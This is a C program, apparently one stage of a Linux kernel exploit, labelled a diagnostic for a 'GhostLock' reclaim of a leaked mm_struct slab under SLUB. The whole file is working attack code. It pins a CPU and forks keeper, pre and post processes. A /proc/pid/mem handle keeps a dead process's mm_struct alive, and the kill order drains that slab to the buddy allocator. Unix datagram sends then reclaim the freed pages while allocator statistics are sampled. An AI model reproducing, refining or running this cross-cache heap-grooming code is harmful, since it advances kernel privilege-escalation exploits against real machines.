/*
 * slabprobe.c — diagnostic for RV101 GhostLock reclaim (v4 design).
 *
 * v4 (derived from SLUB 5.10.209 source analysis):
 *   - allocation slowpath POPS the per-CPU partial chain head, and an empty
 *     chain page popped for allocation is phantom-dropped (get_freelist sets
 *     inuse=objects, page leaves all lists) -> any mm allocation between the
 *     leak-slab-empty state and the drain can DESTROY the leak slab.
 *     => the drain must be triggered by PURE FREES only.
 *   - put_cpu_partial(page, drain=1) triggers unfreeze when the chain's
 *     cumulative pobjects > cpu_partial(13). Each 1st-free of a full slab
 *     adds exactly 1 pobject.
 *   - unfreeze walks chain head->tail; empty pages are discarded only if
 *     nr_partial >= min_partial(5) at that moment; the discard list is LIFO
 *     so the LAST-walked (tail) page is freed FIRST -> buddy head.
 *
 * Flow under test:
 *   1. fork keeper pool (240, pinned, pause)           [full 17/17 slabs]
 *   2. fork pre(16) + leak + post(17); open memfd(leak); leak child exits
 *   3. reverse-kill pre(16)   -> leak slab 1st-free -> CPU0 partial chain
 *   4. kill post(17)          -> post slab 1st-free -> chain (above leak)
 *   5. close(leak memfd)      -> leak slab EMPTY (chain tail)
 *   6. kill keeper[0,17,34,...,238] (15 kills, one per full slab)
 *      -> pobjects crosses 13 -> drain -> leak slab discarded LAST -> buddy
 *   7. IMMEDIATELY 16 x unix-dgram 15872B sends (order-2 kmalloc each)
 *
 * Watch: mm_struct slabs + order-2 free blocks around phases 3..7.
 * Signal of success: order-2 Unmovable +~2 at phase 6, then -~2 at phase 7.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define OBJS 17
#define CORE 0
#define VEH 16
#define SKB_PAYLOAD 15872
#define KEEPERS 240
#define KEEPER_STRIDE 17
#define KEEPER_KILLS 15

static void pin0(void) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(CORE, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

static pid_t child_here(void) {
  pid_t p = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (p == 0) {
    prctl(4 /*PR_SET_PDEATHSIG*/, 9 /*SIGKILL*/, 0, 0, 0);
    if (getppid() == 1) syscall(SYS_exit, 0);
    pin0();
    for (;;) pause();
  }
  return p;
}

static pid_t child_exit_now(void) {
  pid_t p = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (p == 0) syscall(SYS_exit, 0);
  return p;
}

static int open_mem(pid_t p) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", p);
  return open(path, O_RDONLY);
}

static void killc(pid_t p) {
  if (p <= 0) return;
  kill(p, SIGKILL);
  waitpid(p, NULL, 0);
}

struct stat_s {
  int mm_act, mm_slabs, mm_total_slabs;
  int o2_un, o2_mv, o2_rc;
};

static void sample(struct stat_s *s) {
  s->mm_act = s->mm_slabs = s->mm_total_slabs = -1;
  s->o2_un = s->o2_mv = s->o2_rc = -1;
  FILE *f = fopen("/proc/slabinfo", "r");
  if (f) {
    char line[256];
    while (fgets(line, sizeof(line), f)) {
      char name[64];
      int a, b, size, objs, pp;
      if (sscanf(line, "%63s %d %d %d %d %d", name, &a, &b, &size, &objs, &pp) == 6 &&
          !strcmp(name, "mm_struct")) {
        char *sd = strstr(line, "slabdata");
        int as = 0, ts = 0;
        if (sd) sscanf(sd, "slabdata %d %d", &as, &ts);
        s->mm_act = a; s->mm_slabs = as; s->mm_total_slabs = ts;
      }
    }
    fclose(f);
  }
  f = fopen("/proc/pagetypeinfo", "r");
  if (f) {
    char line[512];
    int infree = 0;
    while (fgets(line, sizeof(line), f)) {
      if (!infree) {
        if (strstr(line, "Free pages count per migrate type at order")) infree = 1;
        continue;
      }
      char t[32];
      int n0, n1, n2;
      if (sscanf(line, "Node 0, zone DMA, type %31s %d %d %d", t, &n0, &n1, &n2) == 4) {
        if (!strcmp(t, "Unmovable")) { s->o2_un = n2; }
        else if (!strcmp(t, "Movable")) { s->o2_mv = n2; }
        else if (!strcmp(t, "Reclaimable")) { s->o2_rc = n2; }
      }
    }
    fclose(f);
  }
}

static void report(const char *phase, const struct stat_s *s) {
  printf("[%s] mm(act=%d slabs=%d tot=%d) order2(un=%d mv=%d rc=%d)\n",
         phase, s->mm_act, s->mm_slabs, s->mm_total_slabs,
         s->o2_un, s->o2_mv, s->o2_rc);
  fflush(stdout);
}

static pid_t *spawn(int n, int exit_mode) {
  pid_t *a = malloc(sizeof(pid_t) * n);
  for (int i = 0; i < n; i++)
    a[i] = exit_mode ? child_exit_now() : child_here();
  return a;
}

static void kill_reverse(pid_t *a, int n) {
  for (int i = n - 1; i >= 0; i--) killc(a[i]);
  free(a);
}

int main(int argc, char **argv) {
  (void)argc; (void)argv;
  setvbuf(stdout, NULL, _IONBF, 0);
  pin0();

  struct stat_s s;
  sample(&s);
  report("p0-baseline", &s);

  /* 1. keeper pool (pinned, pause) — forked FIRST so their slabs are full */
  pid_t *keepers = spawn(KEEPERS, 0);
  /* 2. pre + leak + post; leak child exits immediately, pinned only by memfd */
  pid_t *pre = spawn(OBJS - 1, 0);
  pid_t leak = child_exit_now();
  int leakfd = open_mem(leak);
  waitpid(leak, NULL, 0);
  pid_t *post = spawn(OBJS, 0);
  sample(&s); report("p1-spawned(240k+pre16+leak+post17)", &s);

  /* 3. reverse-kill pre: leak slab 1st-free -> CPU0 partial chain */
  kill_reverse(pre, OBJS - 1);
  sample(&s); report("p2-killed-pre16(reverse)", &s);

  /* 4. kill post: post slab 1st-free -> chain head */
  kill_reverse(post, OBJS);
  sample(&s); report("p3-killed-post17", &s);

  /* 5. close memfd: leak slab EMPTY at chain tail */
  close(leakfd);
  sample(&s); report("p4-leak-memfd-closed", &s);

  /* 6. sparse keeper kills -> pobjects > 13 -> drain -> leak slab -> buddy */
  for (int i = 0; i < KEEPER_KILLS; i++) {
    killc(keepers[i * KEEPER_STRIDE]);
    sample(&s);
    char ph[64];
    snprintf(ph, sizeof(ph), "p5-kill#%02d", i);
    report(ph, &s);
  }

  /* 7. IMMEDIATELY 16 vehicles (no printfs before this point after kills) */
  int sv[VEH][2];
  char *buf = malloc(SKB_PAYLOAD);
  memset(buf, 0x42, SKB_PAYLOAD);
  int ok = 0;
  for (int i = 0; i < VEH; i++) {
    sv[i][0] = sv[i][1] = -1;
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv[i]) == 0 &&
        send(sv[i][0], buf, SKB_PAYLOAD, 0) == SKB_PAYLOAD)
      ok++;
  }
  printf("[vehicles] ok=%d/%d\n", ok, VEH);
  sample(&s); report("p6-vehicles-allocated", &s);

  usleep(500000);
  sample(&s); report("p7-after-500ms", &s);

  for (int i = 0; i < VEH; i++) {
    if (sv[i][0] >= 0) close(sv[i][0]);
    if (sv[i][1] >= 0) close(sv[i][1]);
  }
  for (int i = 0; i < KEEPERS; i++)
    if (i % KEEPER_STRIDE != 0)   /* skip the 15 already-killed keepers */
      killc(keepers[i]);
  free(keepers);
  sample(&s); report("p8-cleanup", &s);

  return 0;
}
